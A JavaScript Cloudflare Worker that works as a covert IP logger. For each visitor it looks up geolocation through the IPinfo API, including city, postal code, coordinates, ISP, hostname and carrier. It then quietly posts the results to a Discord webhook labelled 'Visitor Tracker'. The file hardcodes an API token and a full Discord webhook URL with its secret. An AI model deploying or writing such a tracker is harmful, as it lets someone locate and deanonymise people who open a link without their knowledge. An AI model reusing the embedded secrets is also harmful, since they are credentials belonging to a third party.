addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  // Get the visitor's IP address
  const ip = request.headers.get('cf-connecting-ip') || 'unknown';

  // Fetch location data from IPinfo API
  const ipinfoToken = '88ee1b75799078'; 
  const response = await fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`);
  
  if (!response.ok) {
      return new Response('Error fetching location data', { status: 500 });
  }

  const locationData = await response.json();

  // Create a detailed JSON response with IP and location data
  const detailedResponse = {
      ip: ip,
      city: locationData.city || 'N/A',
      region: locationData.region || 'N/A',
      country: locationData.country || 'N/A',
      loc: locationData.loc || 'N/A',
      postal: locationData.postal || 'N/A',
      timezone: locationData.timezone || 'N/A',
      org: locationData.org || 'N/A',  // ISP/Organization
      hostname: locationData.hostname || 'N/A',  // Reverse DNS hostname
      carrier: locationData.carrier || 'N/A',  // Carrier info (if available)
      readme: locationData.readme || 'N/A'  // API usage info
  };

  // Post the data to the Discord webhook
  await postToDiscord(detailedResponse);

  return new Response(JSON.stringify(detailedResponse, null, 2), {
      headers: { 'Content-Type': 'application/json' }
  });
}

// Function to post data to Discord webhook
async function postToDiscord(data) {
  const webhookUrl = 'https://discord.com/api/webhooks/1220099844954132513/8MCYbxGzK81nX3O7h8As78niQ0Rvv5VSbxGA5cQX8VXQPAjkIYwjq8WP08vRoljTQvgp';

  const discordMessage = {
      embeds: [{
          title: 'New Visitor IP Logged',
          fields: [
              { name: 'IP Address', value: data.ip, inline: true },
              { name: 'City', value: data.city, inline: true },
              { name: 'Region', value: data.region, inline: true },
              { name: 'Country', value: data.country, inline: true },
              { name: 'Location', value: data.loc, inline: true },
              { name: 'Postal Code', value: data.postal, inline: true },
              { name: 'Timezone', value: data.timezone, inline: true },
              { name: 'ISP/Organization', value: data.org, inline: true },
              { name: 'Hostname', value: data.hostname, inline: true },
              { name: 'Carrier', value: data.carrier, inline: true },
          ],
          footer: {
              text: 'Visitor Tracker',
          },
      }]
  };

  await fetch(webhookUrl, {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify(discordMessage),
  });
}
